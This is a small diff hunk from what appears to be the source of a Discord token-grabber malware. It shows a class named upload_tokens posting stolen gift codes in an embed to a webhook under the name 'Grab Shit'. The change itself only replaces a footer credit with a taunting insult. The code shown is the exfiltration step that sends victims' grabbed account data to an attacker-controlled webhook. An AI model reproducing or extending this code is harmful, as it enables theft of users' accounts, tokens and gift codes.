@@ -367,6 +367,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/")
+            embed.set_footer(text="THIS TIME YOU ARE FUCKED")
 
             self.webhook.send(embed=embed, username="Grab Shit", avatar_url="https://i.imgur.com/8ljlzRg.png")
